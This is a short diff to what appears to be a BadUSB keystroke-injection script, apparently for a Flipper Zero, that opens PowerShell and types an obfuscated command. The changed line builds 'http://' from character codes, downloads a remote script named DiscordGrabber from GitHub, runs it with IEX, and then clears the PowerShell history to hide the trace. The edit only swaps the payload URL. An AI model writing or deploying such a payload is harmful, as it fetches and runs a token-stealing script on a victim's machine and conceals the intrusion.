@@ -7,6 +7,6 @@ STRING powershell
 DELAY 500
 ENTER
 DELAY 500
-STRING $n='i';set-alias v $n'wr';$b=[char]116;$c=[char]47;$a=$([char]104+$b+$b+[char]112+[char]58+$c+$c);IEX (v -usebasicparsing $a'raw.githubusercontent.com/s4dic/DiscordGrabber/main/bd.ps1?token=GHSAT0AAAAAABXCYHCDPP5IFQCPU2NMQ7XEYXT7E5Q'); PSReadLine; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); exit
+STRING $n='i';set-alias v $n'wr';$b=[char]116;$c=[char]47;$a=$([char]104+$b+$b+[char]112+[char]58+$c+$c);IEX (v -usebasicparsing $a'raw.githubusercontent.com/s4dic/FlipperZero/main/BadUsb/DiscordGrabber/payload.ps1'); PSReadLine; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); exit
 DELAY 500
 ENTER
